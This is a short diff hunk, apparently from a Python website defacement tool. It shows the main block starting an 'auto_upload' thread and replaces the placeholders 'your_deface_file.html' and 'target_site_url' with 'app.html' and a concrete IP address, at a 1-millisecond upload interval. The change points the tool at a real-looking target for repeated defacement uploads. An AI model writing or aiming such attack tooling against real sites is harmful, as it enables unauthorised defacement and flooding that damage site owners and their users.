@@ -236,6 +236,6 @@ def auto_upload(script, target_url, interval_ms):
 if __name__ == "__main__":
     banner = banner.replace("[⍟]", "[AUTO⍟]")
     interval_ms = 1  # Adjust the interval in milliseconds
-    auto_upload_thread = threading.Thread(target=auto_upload, args=("your_deface_file.html", "target_site_url", interval_ms))
+    auto_upload_thread = threading.Thread(target=auto_upload, args=("app.html", "http://83.211.190.83", interval_ms))
     auto_upload_thread.start()
     main(banner)
